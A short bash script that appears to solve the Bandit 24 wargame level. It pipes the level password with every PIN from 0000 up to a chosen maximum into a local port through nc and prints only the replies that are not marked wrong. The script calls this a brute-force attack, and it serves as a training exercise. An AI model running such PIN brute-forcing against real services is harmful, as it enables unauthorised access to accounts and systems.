#!/bin/bash
read -p "Enter Bandit24 password: " password
read -p "Enter maximum PIN number (e.g 9999): " max_num
read -p "Enter port (e.g 30002): " port

echo "[#] Starting brute-force attack..."

(
for pin in $(seq -w 0 "$max_num"); do
echo "$password $pin"
done
sleep 1
) | nc localhost "$port" | grep -v -i "Wrong"
